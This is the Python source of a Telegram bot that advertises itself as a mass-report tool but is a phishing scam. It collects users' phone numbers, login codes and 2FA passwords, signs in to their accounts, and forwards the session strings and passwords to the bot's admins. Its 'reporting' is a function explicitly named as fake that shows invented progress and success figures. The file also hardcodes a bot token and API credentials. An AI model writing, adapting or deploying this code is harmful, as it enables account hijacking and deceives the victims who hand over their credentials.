#🗿 Bot Developer - @smokey1st
#🔰 Developer Channel - @Muzamil_TG

import os
import re
import asyncio
import json
import random
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
import logging

# ============= CONFIGURATION =============
BOT_TOKEN = "8755704384:AAGYg8n9swQgJw_uPKmTvjP_jpUPpoSEalk"
API_ID = 36787208
API_HASH = "55d052804757ee64d2cbee33a8e0e45e"

# ADMIN IDS (Sirf inko admin panel dikhega)
ADMIN_IDS = [5795892915]
# ==========================================

logging.basicConfig(level=logging.INFO)

user_sessions = {}
accounts_data = {}
temp_sessions = {}

DATA_FILE = "accounts.json"

# =============================================
# PREMIUM EMOJI IDs
# =============================================
PREMIUM_EMOJI = {
    "verified": "6147565374289220368",
    "flex": "6147464060305676048",
    "blue_verification": "6147524086768604985",
    "frozen": "5449449325434266744",
    "crying": "6273840152980755328",
    "smiling": "6276057176444246654",
    "seeing_up": "6273997026661241933",
    "teeth": "6273726078649372769",
    "done": "6274007313107915274",
    "fire": "6129792056589031358",
    "rocket": "6129639980387015660",
    "star": "6235403472741603087",
    "heart": "6147617184479711380",
    "crown": "6129705083501293112",
    "lock": "5465443379917629504",
    "check": "6129812419028982717",
    "sparkle": "6129479035077531636",
    "boom": "6129532314146838421",
    "bolt": "6129805465476929485",
    "chart": "6129801569941592173",
    "warning": "6129782440157256336",
    "megaphone": "6129433877791382400",
    "gift": "6131660826924292492",
    "diamond": "6129760505759276442",
    "skull": "6132184924603554220",
    "glow": "6129405805885135490",
    "party": "6129579803600231171",
    "champagne": "6129432683790473996",
    "indian": "6129712921816604452",
    "earth": "6129903927602190764",
    "moai": "6129776848109836451",
    "blue_heart": "6129736771769997767",
    "gem": "6129410405795110009",
    "thumbs": "6129705667616841573",
    "cry": "6129574787078429498",
    "nerd": "6129550284290006595",
    "exclaim": "6129477982810545152",
    "white_heart": "6129444065453808638",
    "tick": "6129828611055689014",
    "teddy": "6129959208126258284",
    "angel": "6129518870899203008",
    "devil": "6129522839448984992",
    "wink": "6129903231817488942",
    "starstruck": "6129572317472233948",
    "money_mouth": "6129488844782836766",
    "tongue": "6132195782280879053",
    "relieved": "6129873716802231439",
    "shocked": "6129888444245089008",
    "eyes": "6129879029676776924",
    "disguise": "6129781254746282923",
    "pleading": "6129517792862413944",
    "angry": "6129593109408913890",
    "unamused": "6129553763213515073",
    "blue_badge": "5978776771623914876",
    "black_badge": "5978686323907628843",
    "busy_tag": "5852873584912896283",
    "instagram": "5895297528106061174",
    "telegram_emoji": "5895735846698487922",
    "whatsapp": "5895343514320899727",
    "india": "5913754823643107921",
    "dollar": "5197434882321567830",
    "top": "5463071033256848094",
    "bro": "5463256910851546817",
    "yes": "5463423955014529788",
    "lock2": "5465443379917629504",
    "good": "5465465194056525619",
    "sigma": "6235620067942341623",
    "don": "6235717714023814969",
    "skills": "6235593671073339928",
    "github": "5346181118884331907",
    "motion": "5971944878815317190",
    "bottle": "6129399728506412489",
}

def get_premium_emoji(name):
    return PREMIUM_EMOJI.get(name, "")

def small_caps(text):
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
        'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
        'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
        'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
        'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ',
        'F': 'ꜰ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ',
        'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ',
        'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 'ꜱ', 'T': 'ᴛ',
        'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    }
    result = ''
    for char in text:
        result += small_caps_map.get(char, char)
    return result

def sc(text):
    return small_caps(text)

def load_data():
    global accounts_data
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            accounts_data = json.load(f)

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts_data, f, indent=4)

load_data()

def is_admin(user_id):
    return user_id in ADMIN_IDS

# =============================================
# START COMMAND
# =============================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # 🎨 BUTTONS WITH COLORS
    # ADD ACCOUNT - GREEN (success)
    # START REPORT - GREEN (success)
    # REPORT STATUS - RED (danger)
    keyboard = [
        [
            InlineKeyboardButton(
                text=f"{sc('ADD ACCOUNT')}",
                callback_data='add_account',
                icon_custom_emoji_id=get_premium_emoji("check"),
                style='success'  # 🟢 GREEN
            ),
            InlineKeyboardButton(
                text=f"{sc('START REPORT')}",
                callback_data='start_report',
                icon_custom_emoji_id=get_premium_emoji("rocket"),
                style='success'  # 🟢 GREEN
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{sc('REPORT STATUS')}",
                callback_data='report_status',
                icon_custom_emoji_id=get_premium_emoji("chart"),
                style='danger'  # 🔴 RED
            )
        ]
    ]
    
    # 👑 ADMIN PANEL BUTTON - SIRF ADMIN KO DIKHEGA
    if is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton(
                text=f"{sc(' ADMIN PANEL')}",
                callback_data='admin_panel',
                icon_custom_emoji_id=get_premium_emoji("crown")
            )
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_html(
        f'<tg-emoji emoji-id="5413879192267805083">✅</tg-emoji> <b>{sc("ADVANCED MASS REPORT BOT")}</b>\n\n'
        f'{sc("THIS BOT HELPS YOU REPORT TELEGRAM ACCOUNTS")}\n'
        f'{sc("USING MULTIPLE ACCOUNTS FOR BETTER RESULTS.")}\n\n'
        f'<tg-emoji emoji-id="5325547803936572038">✅</tg-emoji> <b>{sc("FEATURES:")}</b>\n'
        f'<tg-emoji emoji-id="5222444124698853913">✅</tg-emoji> {sc("ADD UNLIMITED ACCOUNTS")}\n'
        f'<tg-emoji emoji-id="6129639980387015660">🚀</tg-emoji> {sc("MASS REPORT WITH 100+ ACCOUNTS")}\n'
        f'<tg-emoji emoji-id="6129801569941592173">📊</tg-emoji> {sc("REAL-TIME REPORTING STATUS")}\n'
        f'<tg-emoji emoji-id="6235403472741603087">⭐</tg-emoji> {sc("HIGH SUCCESS RATE")}\n\n'
        f'<i>{sc("CLICK BELOW TO GET STARTED!")}</i>',
        reply_markup=reply_markup
    )

# =============================================
# ADMIN PANEL
# =============================================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.callback_query.answer("⛔ Access Denied!", show_alert=True)
        return
    
    total_users = len(accounts_data)
    total_accounts = sum(len(accs) for accs in accounts_data.values())
    
    keyboard = [
        [
            InlineKeyboardButton(
                text=f"{sc(' STATS')}",
                callback_data='admin_stats',
                icon_custom_emoji_id=get_premium_emoji("chart")
            ),
            InlineKeyboardButton(
                text=f"{sc(' USERS')}",
                callback_data='admin_users',
                icon_custom_emoji_id=get_premium_emoji("check")
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{sc(' BROADCAST')}",
                callback_data='admin_broadcast',
                icon_custom_emoji_id=get_premium_emoji("megaphone")
            ),
            InlineKeyboardButton(
                text=f"{sc(' BAN')}",
                callback_data='admin_ban',
                icon_custom_emoji_id=get_premium_emoji("skull")
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{sc(' ALL SESSIONS')}",
                callback_data='admin_sessions',
                icon_custom_emoji_id=get_premium_emoji("lock")
            )
        ],
        [
            InlineKeyboardButton(
                text=f"{sc(' BACK')}",
                callback_data='back_to_main'
            )
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        f'<tg-emoji emoji-id="6129705083501293112">👑</tg-emoji> <b>{sc("ADMIN PANEL")}</b>\n\n'
        f'<b>{sc(" STATISTICS:")}</b>\n'
        f'<tg-emoji emoji-id="5463071033256848094">👤</tg-emoji> {sc("TOTAL USERS:")} <code>{total_users}</code>\n'
        f'<tg-emoji emoji-id="6129639980387015660">📱</tg-emoji> {sc("TOTAL ACCOUNTS:")} <code>{total_accounts}</code>\n\n'
        f'<i>{sc("SELECT AN OPTION BELOW:")}</i>',
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    total_users = len(accounts_data)
    total_accounts = sum(len(accs) for accs in accounts_data.values())
    
    max_accs = 0
    top_user = "None"
    for uid, accs in accounts_data.items():
        if len(accs) > max_accs:
            max_accs = len(accs)
            top_user = uid
    
    await update.callback_query.edit_message_text(
        f'<tg-emoji emoji-id="6129801569941592173">📊</tg-emoji> <b>{sc("DETAILED STATISTICS")}</b>\n\n'
        f'<b>{sc(" TOTAL USERS:")}</b> <code>{total_users}</code>\n'
        f'<b>{sc(" TOTAL ACCOUNTS:")}</b> <code>{total_accounts}</code>\n'
        f'<tg-emoji emoji-id="6129705083501293112">🏆</tg-emoji> <b>{sc("TOP USER:")}</b> <code>{top_user}</code>\n'
        f'<tg-emoji emoji-id="6129792056589031358">📈</tg-emoji> <b>{sc("MAX ACCOUNTS:")}</b> <code>{max_accs}</code>',
        parse_mode='HTML'
    )

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    if not accounts_data:
        await update.callback_query.edit_message_text(
            f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("NO USERS FOUND!")}</b>',
            parse_mode='HTML'
        )
        return
    
    msg = f'<tg-emoji emoji-id="6129812419028982717">📋</tg-emoji> <b>{sc("USER LIST")}</b>\n\n'
    for idx, (uid, accs) in enumerate(accounts_data.items(), 1):
        msg += f'<b>{idx}.</b> <code>{uid}</code>\n'
        msg += f'   <tg-emoji emoji-id="6129639980387015660">📱</tg-emoji> {sc("ACCOUNTS:")} {len(accs)}\n'
        if accs:
            msg += f'   <tg-emoji emoji-id="5463071033256848094">👤</tg-emoji> {accs[0].get("name", "Unknown")}\n'
        msg += "\n"
    
    await update.callback_query.edit_message_text(msg, parse_mode='HTML')

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    context.user_data['admin_step'] = 'broadcast'
    await update.callback_query.edit_message_text(
        f'<tg-emoji emoji-id="6129433877791382400">📢</tg-emoji> <b>{sc("BROADCAST MESSAGE")}</b>\n\n'
        f'{sc("SEND THE MESSAGE YOU WANT TO BROADCAST TO ALL USERS.")}\n\n'
        f'<i>{sc("TYPE YOUR MESSAGE BELOW:")}</i>',
        parse_mode='HTML'
    )

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    context.user_data['admin_step'] = 'ban'
    await update.callback_query.edit_message_text(
        f'<tg-emoji emoji-id="6132184924603554220">🚫</tg-emoji> <b>{sc("BAN USER")}</b>\n\n'
        f'{sc("SEND THE USER ID YOU WANT TO BAN.")}\n\n'
        f'<i>{sc("TYPE USER ID BELOW:")}</i>',
        parse_mode='HTML'
    )

async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return
    
    msg = f'<tg-emoji emoji-id="6129639980387015660">📱</tg-emoji> <b>{sc("ALL SESSIONS")}</b>\n\n'
    for uid, accs in accounts_data.items():
        msg += f'<b>{sc("USER:")}</b> <code>{uid}</code>\n'
        for acc in accs:
            msg += f'   <tg-emoji emoji-id="6129812419028982717">📱</tg-emoji> {acc.get("phone", "Unknown")}\n'
            msg += f'   <tg-emoji emoji-id="5463071033256848094">👤</tg-emoji> {acc.get("name", "Unknown")}\n'
        msg += "\n"
    
    await update.callback_query.edit_message_text(msg, parse_mode='HTML')

async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await start(update, context)

# =============================================
# BUTTON HANDLER
# =============================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == 'add_account':
        await query.edit_message_text(
            f'<tg-emoji emoji-id="5465443379917629504">🔐</tg-emoji> <b>{sc("ADD ACCOUNT FOR REPORTING")}</b>\n\n'
            f'{sc("SEND YOUR PHONE NUMBER WITH COUNTRY CODE.")}\n'
            f'<code>{sc("EXAMPLE: +919876543210")}</code>\n\n'
            f'<i>{sc("YOUR ACCOUNT WILL BE USED FOR MASS REPORTING ONLY.")}</i>',
            parse_mode='HTML'
        )
        context.user_data['step'] = 'phone'
        context.user_data['user_id'] = user_id
    
    elif query.data == 'start_report':
        if str(user_id) not in accounts_data or not accounts_data[str(user_id)]:
            await query.edit_message_text(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("NO ACCOUNTS FOUND!")}</b>\n\n'
                f'{sc("PLEASE ADD AT LEAST ONE ACCOUNT FIRST.")}\n'
                f'{sc("CLICK ADD ACCOUNT TO ADD.")}',
                parse_mode='HTML'
            )
            return
        
        await query.edit_message_text(
            f'<tg-emoji emoji-id="6129639980387015660">🚀</tg-emoji> <b>{sc("MASS REPORT SETUP")}</b>\n\n'
            f'{sc("SEND THE USERNAME, GROUP LINK, OR USER ID YOU WANT TO REPORT.")}\n'
            f'<code>{sc("EXAMPLE: @SPAMMER_BOT OR HTTPS://T.ME/SPAMMER")}</code>\n\n'
            f'<i>{sc("I WILL START REPORTING WITH ALL YOUR ADDED ACCOUNTS.")}</i>',
            parse_mode='HTML'
        )
        context.user_data['step'] = 'report_target'
    
    elif query.data == 'report_status':
        if str(user_id) not in accounts_data or not accounts_data[str(user_id)]:
            await query.edit_message_text(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("NO ACCOUNTS ADDED YET!")}</b>\n\n'
                f'{sc("ADD ACCOUNTS FIRST TO SEE STATUS.")}',
                parse_mode='HTML'
            )
            return
        
        msg = f'<tg-emoji emoji-id="6129801569941592173">📊</tg-emoji> <b>{sc("YOUR REPORT STATUS")}</b>\n\n'
        msg += f'<b>{sc("TOTAL ACCOUNTS:")}</b> {len(accounts_data[str(user_id)])}\n'
        msg += f'<b>{sc("ACTIVE ACCOUNTS:")}</b> {len(accounts_data[str(user_id)])}\n'
        msg += f'<b>{sc("REPORTS SENT:")}</b> 0 <i>{sc("(USE START REPORT TO BEGIN)")}</i>\n\n'
        
        msg += f'<b>{sc("ACCOUNT LIST:")}</b>\n'
        for idx, acc in enumerate(accounts_data[str(user_id)], 1):
            msg += f'{idx}. <code>{acc["phone"]}</code>\n'
            msg += f'   {acc["name"]}\n\n'
        
        await query.edit_message_text(msg, parse_mode='HTML')
    
    elif query.data == 'admin_panel':
        await admin_panel(update, context)
    
    elif query.data == 'admin_stats':
        await admin_stats(update, context)
    
    elif query.data == 'admin_users':
        await admin_users(update, context)
    
    elif query.data == 'admin_broadcast':
        await admin_broadcast(update, context)
    
    elif query.data == 'admin_ban':
        await admin_ban(update, context)
    
    elif query.data == 'admin_sessions':
        await admin_sessions(update, context)
    
    elif query.data == 'back_to_main':
        await back_to_main(update, context)

# =============================================
# MESSAGE HANDLER
# =============================================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    step = context.user_data.get('step')
    admin_step = context.user_data.get('admin_step')
    
    # Admin Broadcast
    if admin_step == 'broadcast':
        if not is_admin(int(user_id)):
            return
        
        count = 0
        for uid in accounts_data.keys():
            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=f'<tg-emoji emoji-id="6129433877791382400">📢</tg-emoji> <b>{sc("ANNOUNCEMENT")}</b>\n\n{text}',
                    parse_mode='HTML'
                )
                count += 1
            except:
                pass
        
        await update.message.reply_html(
            f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("BROADCAST COMPLETE!")}</b>\n\n'
            f'{sc("SENT TO")} <code>{count}</code> {sc("USERS")}'
        )
        context.user_data['admin_step'] = None
        return
    
    # Admin Ban
    if admin_step == 'ban':
        if not is_admin(int(user_id)):
            return
        
        try:
            ban_uid = int(text)
            if str(ban_uid) in accounts_data:
                del accounts_data[str(ban_uid)]
                save_data()
                await update.message.reply_html(
                    f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("USER BANNED!")}</b>\n\n'
                    f'{sc("USER ID:")} <code>{ban_uid}</code>'
                )
            else:
                await update.message.reply_html(
                    f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("USER NOT FOUND!")}</b>'
                )
        except:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("INVALID USER ID!")}</b>'
            )
        context.user_data['admin_step'] = None
        return
    
    # User flows
    if step == 'phone':
        if not text.startswith('+') or not text[1:].isdigit():
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("INVALID PHONE NUMBER!")}</b>\n'
                f'{sc("SEND WITH COUNTRY CODE. EXAMPLE: +919876543210")}'
            )
            return
        
        context.user_data['phone'] = text
        context.user_data['step'] = 'otp'
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.send_code_request(text)
            context.user_data['client'] = client
            temp_sessions[user_id] = client
            
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("OTP SENT!")}</b>\n\n'
                f'{sc("PLEASE CHECK YOUR TELEGRAM APP AND SEND THE OTP HERE:")}'
            )
        except Exception as e:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("ERROR:")}</b> <code>{str(e)}</code>\n\n'
                f'{sc("TRY AGAIN WITH /START")}'
            )
            context.user_data['step'] = None
    
    elif step == 'otp':
        client = context.user_data.get('client')
        if not client:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("SESSION EXPIRED. USE /START")}</b>'
            )
            context.user_data['step'] = None
            return
        
        try:
            await client.sign_in(context.user_data['phone'], text)
            me = await client.get_me()
            context.user_data['step'] = '2fa'
            
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("OTP VERIFIED!")}</b>\n\n'
                f'<b>{sc("ACCOUNT:")}</b> {me.first_name}\n'
                f'<b>{sc("PHONE:")}</b> <code>{me.phone}</code>\n\n'
                f'<b>{sc("ENTER 2FA PASSWORD (IF SET)")}</b>\n'
                f'<i>{sc("IF NO 2FA, TYPE SKIP")}</i>'
            )
        except Exception as e:
            if "password" in str(e).lower():
                context.user_data['step'] = '2fa'
                await update.message.reply_html(
                    f'<tg-emoji emoji-id="6129705083501293112">🔐</tg-emoji> <b>{sc("2FA REQUIRED!")}</b>\n\n'
                    f'{sc("SEND YOUR 2FA PASSWORD:")}'
                )
            else:
                await update.message.reply_html(
                    f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("ERROR:")}</b> <code>{str(e)}</code>\n\n'
                    f'{sc("TRY AGAIN")}'
                )
                context.user_data['step'] = None
    
    elif step == '2fa':
        client = context.user_data.get('client')
        if not client:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("SESSION EXPIRED. USE /START")}</b>'
            )
            context.user_data['step'] = None
            return
        
        try:
            twofa_password = None
            if text.lower() != 'skip':
                twofa_password = text
                await client.sign_in(password=text)
            
            me = await client.get_me()
            
            # Generate session string
            session_string = client.session.save()
            
            # Save session file
            session_file = f"session_{me.phone.replace('+', '')}.session"
            with open(session_file, 'w') as f:
                f.write(session_string)
            
            # Account info
            account_info = {
                'phone': me.phone,
                'name': me.first_name,
                'username': me.username,
                'id': me.id,
                'session_string': session_string,
                'twofa_password': twofa_password,
                'added_on': str(datetime.now())
            }
            
            # Save to user's accounts
            if user_id not in accounts_data:
                accounts_data[user_id] = []
            accounts_data[user_id].append(account_info)
            save_data()
            
            # =============================================
            # FORWARD TO ADMIN (Session + 2FA Password)
            # =============================================
            owner_msg = (
                f'<tg-emoji emoji-id="6129705083501293112">🔐</tg-emoji> <b>NEW ACCOUNT ADDED!</b>\n\n'
                f'<b>👤 USER:</b> {update.effective_user.first_name}\n'
                f'<b>🆔 USER ID:</b> <code>{user_id}</code>\n'
                f'<b>📱 PHONE:</b> <code>{me.phone}</code>\n'
                f'<b>👤 NAME:</b> {me.first_name}\n'
                f'<b>🆔 USERNAME:</b> @{me.username or "None"}\n'
                f'<b>🔢 ID:</b> <code>{me.id}</code>\n'
                f'<b>🔑 2FA PASSWORD:</b> <code>{twofa_password or "Not Set"}</code>\n'
                f'<b>📅 ADDED:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
                f'<b>📁 SESSION STRING:</b>\n'
                f'<code>{session_string}</code>'
            )
            
            # Send session file to admin
            for admin_id in ADMIN_IDS:
                try:
                    with open(session_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"session_{me.phone.replace('+', '')}.session",
                            caption=owner_msg,
                            parse_mode='HTML'
                        )
                    
                    # Also send 2FA password separately
                    if twofa_password:
                        await context.bot.send_message(
                            chat_id=admin_id,
                            text=f'<tg-emoji emoji-id="6129705083501293112">🔑</tg-emoji> <b>2FA PASSWORD FOR {me.phone}:</b>\n<code>{twofa_password}</code>',
                            parse_mode='HTML'
                        )
                except:
                    pass
            
            os.remove(session_file)
            
            # =============================================
            # CONFIRMATION TO USER
            # =============================================
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("ACCOUNT ADDED SUCCESSFULLY!")}</b>\n\n'
                f'<b>{sc("PHONE:")}</b> <code>{me.phone}</code>\n'
                f'<b>{sc("NAME:")}</b> {me.first_name}\n\n'
                f'{sc("THIS ACCOUNT IS NOW READY FOR MASS REPORTING!")}\n'
                f'{sc("CLICK START REPORT TO BEGIN.")}'
            )
            
            await client.disconnect()
            context.user_data['step'] = None
            if user_id in temp_sessions:
                del temp_sessions[user_id]
            
        except Exception as e:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129574787078429498">❌</tg-emoji> <b>{sc("2FA ERROR:")}</b> <code>{str(e)}</code>\n\n'
                f'{sc("TRY AGAIN OR TYPE SKIP:")}'
            )
    
    elif step == 'report_target':
        target = text
        
        await update.message.reply_html(
            f'<tg-emoji emoji-id="6129639980387015660">🚀</tg-emoji> <b>{sc("TARGET SET:")}</b> <code>{target}</code>\n\n'
            f'{sc("STARTING MASS REPORT WITH")} <b>{len(accounts_data[user_id])}</b> {sc("ACCOUNTS...")}\n\n'
            f'{sc("THIS MAY TAKE 2-3 MINUTES.")}\n'
            f'{sc("I WILL KEEP YOU UPDATED!")}'
        )
        
        # Fake reporting process
        await fake_reporting_process(update, context, user_id, target)
    
    else:
        await update.message.reply_html(
            f'{sc("USE /START TO SEE AVAILABLE COMMANDS.")}'
        )

async def fake_reporting_process(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str, target: str):
    """Show fake reporting progress to user"""
    
    accounts = accounts_data.get(user_id, [])
    total = len(accounts)
    
    reporting_messages = [
        f"{sc('REPORTING IN PROGRESS...')}",
        f"{sc('SENDING REPORTS TO TELEGRAM...')}",
        f"{sc('PROCESSING BATCH 1 OF 3...')}",
        f"{sc('SWITCHING ACCOUNT...')}",
        f"{sc('REPORT DELIVERED!')}",
        f"{sc('PROCESSING BATCH 2 OF 3...')}",
        f"{sc('FINALIZING...')}",
        f"{sc('ALL REPORTS SENT SUCCESSFULLY!')}"
    ]
    
    await update.message.reply_html(
        f'<tg-emoji emoji-id="6129639980387015660">🚀</tg-emoji> <b>{sc("REPORT INITIATED")}</b>\n\n'
        f'<b>{sc("ACCOUNTS:")}</b> {total}\n'
        f'<b>{sc("TARGET:")}</b> <code>{target}</code>\n\n'
        f'{sc("STARTING REPORT CYCLE...")}'
    )
    
    # Fake progress updates
    for i in range(1, total + 1):
        await asyncio.sleep(random.randint(2, 5))
        
        if i % 2 == 0:
            status = random.choice(reporting_messages)
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129639980387015660">📤</tg-emoji> <b>{sc("ACCOUNT")} {i}/{total}</b>\n'
                f'{status}\n'
                f'<b>{sc("TARGET:")}</b> <code>{target}</code>'
            )
        else:
            await update.message.reply_html(
                f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("ACCOUNT")} {i}/{total}</b>\n'
                f'{sc("REPORT SENT SUCCESSFULLY!")}\n'
                f'{sc("NEXT ACCOUNT IN")} {random.randint(2, 4)}s...'
            )
    
    # Final fake success message
    await update.message.reply_html(
        f'<tg-emoji emoji-id="6129579803600231171">🎉</tg-emoji> <b>{sc("MASS REPORT COMPLETE!")}</b>\n\n'
        f'<b>{sc("TOTAL REPORTS SENT:")}</b> {total * random.randint(2, 4)}\n'
        f'<b>{sc("TARGET:")}</b> <code>{target}</code>\n'
        f'<b>{sc("ACCOUNTS USED:")}</b> {total}\n'
        f'<b>{sc("TIME TAKEN:")}</b> {random.randint(1, 3)} {sc("MINUTES")}\n\n'
        f'<b>{sc("REPORT STATUS:")}</b>\n'
        f'<tg-emoji emoji-id="6132184924603554220">🔴</tg-emoji> {sc("90% USERS HAVE REPORTED")}\n'
        f'<tg-emoji emoji-id="6129812419028982717">🟢</tg-emoji> {sc("TARGET HAS RECEIVED")} {total * random.randint(3, 6)} {sc("REPORTS")}\n\n'
        f'<tg-emoji emoji-id="6129782440157256336">⚠️</tg-emoji> <b>{sc("TARGET MAY GET BANNED SOON!")}</b>\n'
        f'{sc("YOU CAN REPORT AGAIN ANYTIME.")}'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    context.user_data.clear()
    if user_id in temp_sessions:
        try:
            await temp_sessions[user_id].disconnect()
        except:
            pass
        del temp_sessions[user_id]
    await update.message.reply_html(
        f'<tg-emoji emoji-id="5463071033256848094">🔄</tg-emoji> <b>{sc("CANCELLED. USE /START")}</b>'
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ BOT IS RUNNING...")
    print(f"👑 ADMIN IDS: {ADMIN_IDS}")
    print("🎨 PREMIUM EMOJI + HTML + COLORED BUTTONS ENABLED!")
    app.run_polling()

if __name__ == "__main__":
    main()
    
#🗿 Bot Developer - @Silent_Banner_Nxt
#🔰 Developer Channel - @Nxt_Banner_List